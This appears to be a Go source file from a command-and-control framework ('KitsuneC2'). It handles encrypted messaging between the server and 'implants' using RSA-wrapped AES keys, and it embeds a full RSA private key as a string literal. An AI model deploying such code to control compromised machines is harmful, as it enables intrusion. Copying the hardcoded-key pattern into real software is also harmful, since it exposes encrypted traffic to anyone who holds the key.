package transport

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"net"
	"reflect"
)

// A Session consists of an open socket connection, and the aes-key used to encrypt/decrypt data going in/out
// this socket
type Session struct {
	Connection net.Conn
	AesKey     []byte
}

var privKey string = "MIIEpAIBAAKCAQEApBu0qZ45NuQ5WQ1TAtnKR45Joj3JvaT+umIOysCiUXB+IOs7cUjY1Pqmnt61x78+gBV+jBI5eQIPO9ZaAtxLlBjFAZza8YvMgUr4csqMC1yn/hBi7O80qhROE+7XCwCsn8snfCvjX72wQ7YbcEuPs4vLU+loVPyjyTBvnvgpveciozDK0xpVLt9fdMgmJn5VgvIG+5VleVve2PSrZinOGng8FvjsGV0gvQ6NbUyylyF4Ncov/nNYr9d39UJpSK6pTIA/GysE4V8IMO2tlccbo7ovNqulPCr2BYFxktaUolkw1wZ5TeNvxZ/NodHIxzTArVEt8cJqR98XjwdAYuYYpwIDAQABAoIBAQCZ4lkAjJu9+zhDZxkmHS9u9d/aQPJB4Mvz3itcuFH85+191NbCnbqly/weEVyH1681z/IASr6V1/aM960j7Yr5blid8IXl5l94BeL/USsNJG9q79azsoLB0ZR9YINJj/JPTOLTrxvhFTCJ7ePA4zn29OlO4BmzR8wVxlOEz9Pke63hf8EHFsdKis3hEg1xtCFWlPXXhDRpe133BZVA72sL4oTU4Kqa3YkmCVnXqpz8st4nfpjx3YdrcOAZ1P5Vkg9m3QNqE2izNtA9BkSUUSfTbEnMN0l1zBGLfSXa3IiyayKlFdkHFQFy74igogcWFCwD9BHrrFrPE6sily3iIVhxAoGBAMRwxZfi5XwQm9w1zAxaNS4QA7CS+wzKqhVkldmTrlvOPx2L637c0u4v49+reYxbuTR2uFXLKRPCzcSOBCEydblE9VRfqV0FYDaiJsnTAwN40HRzVC4u420wQDGMDrJ8zK9sW+GuYY8IDxvw+HVRsWLXIXSQ/47Uj/z0O2ju6aKrAoGBANXdYZ2aJt/thkEJYW8SPP6Dfh6i0IBEL7PEJ3KgBBLhd0b0AXCe+aOAolf48ZTTjno1GztRZd/PxLGEdySXsPbsji6DMNzPtWM5pwxw1fTXBffQTybQzbLGevkXtWoYVf0QBLAdFkANZrjfL4YycJqQYIFVXvYYws9cxpdBAEH1AoGAV5Dlo+Uy4vEMaUdZ5A+6MQRWgLmkS3l0BAFIgyq/yJDRtbwPiAerxx11+NiZYCXrEyXw2d2sO/DUhM/Bq4Kw05uXuLrD5oFk+DWkEMeNSljqo15dohCotJ2ToAKM8qeLHo+xDZMMThQLmCr8tl9qMWMwuKOCKAs8/EdqzEXjw+0CgYB7lHdJyL/Z+bjwb+k7c4CHWZhRP6fX1o7yA9D/rXNtLZftCiai21pJnpUw3ItMgor8Fx/rQPfrQnXYVkE6heUeakcmnWxozCV2duQOjk00M+Qg9OAn/9Q9D/ATbB3KdtGJb+4ljklDLftDrMQbeZ4T0oXRdnFvJ5O6m1OuJ0Ns2QKBgQCdpW8Ua3yaUGrex3XFmSnn2V+gNfScVpQN0OBWpNx3nj5sGE8mzS8tpFhMrOaDARwSTN1AfRNJUr5BucpWsVS4H4KdW7AsxVAhHgfKE4tYQDCUKr3ndijFqyOrT/t58XxKsd8RA0oekoVjvRT0ESqZWNZ5RKkudUG2YWiA3haXnA=="

// Given a session, messageType and corresponding data, this function will encrypt the message and send it over an existing connection.
func SendEnvelopeToImplant(sess *Session, messageType int, data interface{}) error {
	encryptedJson, err := communication.PackAndEncryptEnvelope(messageType, data, sess.AesKey)
	if err != nil {
		return err
	}
	//create a buffer and write the len(encryptedData) + encryptedData into it
	buffer := new(bytes.Buffer)
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedJson)))
	buffer.Write(encryptedJson)

	err = communication.WriteToSocket(sess.Connection, buffer.Bytes())
	if err != nil {
		return err
	}

	return nil
}

// Reads an envelope sent by an implant on connection. Returns messageType, data structure belonging to said messageType
// (see /lib/communication/serializable.go), and a session object.
func ReceiveEnvelopeFromImplant(connection net.Conn) (int, interface{}, *Session, error) {
	// A message sent by the implant has the following structure:
	// uint32(length of whole message)-uint32(length of encrypted aes key)-[]byte(encryptedAesKey)-[]byte encryptedEnvelope
	// We first read the first 4 bytes (uint32) on the connection to determine the length of the message, then we read the whole message
	// We read the first 4 bytes of the message to determine the length of the encrypted aesKey. Knowing this information, we can
	// split the message in an encrypted AES key and the encrypted envelope. Using our private key we can decrypt the aes key, and with
	// that key we can decrypt the message.

	messageLengthAsBytes, err := communication.ReadFromSocket(connection, 4) //read 4 bytes from connection to determine messageLen
	if err != nil {
		return -1, nil, nil, err
	}
	messageLength := binary.LittleEndian.Uint32(messageLengthAsBytes)

	messageContent, err := communication.ReadFromSocket(connection, int(messageLength)) //store whole message in buffer
	if err != nil {
		return -1, nil, nil, err
	}

	keyLen := binary.LittleEndian.Uint32(messageContent[:4]) //first 4 bytes of the message indicate encrypted AES key length
	encryptedKey := messageContent[4 : keyLen+4]             //encrypted AES key
	cipherText := messageContent[keyLen+4:]                  //encrypted envelope
	privateKey, _ := cryptography.StringToRsaPrivateKey(privKey)
	aesKey, err := cryptography.DecryptWithRsaPrivateKey(encryptedKey, privateKey) //decrypt AES key using our private key
	if err != nil {
		return -1, nil, nil, err
	}

	rawJsonAsBytes, err := cryptography.DecryptAes(cipherText, aesKey) //decrypt envelope with AES key
	if err != nil {
		return -1, nil, nil, err
	}

	var messageEnvelope *communication.Envelope = new(communication.Envelope)
	err = json.Unmarshal(rawJsonAsBytes, messageEnvelope)
	if err != nil {
		return -1, nil, nil, errors.New("could not unmarshal decrypted message to an envelope")
	}

	dataAsStruct := communication.MessageTypeToStruct[messageEnvelope.MessageType]()
	err = json.Unmarshal(messageEnvelope.Data, dataAsStruct)
	if err != nil {
		return -1, nil, nil, errors.New("data does not correspond to messageType")
	}

	//use reflection to check that MessageType and data correspond correctly.
	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[messageEnvelope.MessageType]())
	dataType := reflect.TypeOf(dataAsStruct)
	if !dataType.AssignableTo(expectedType) && !reflect.PointerTo(dataType).AssignableTo(expectedType) {
		return -1, nil, nil, errors.New("data does not correspond to messageType")
	}

	var sess *Session = new(Session)
	sess.Connection = connection
	sess.AesKey = aesKey
	return messageEnvelope.MessageType, dataAsStruct, sess, nil
}
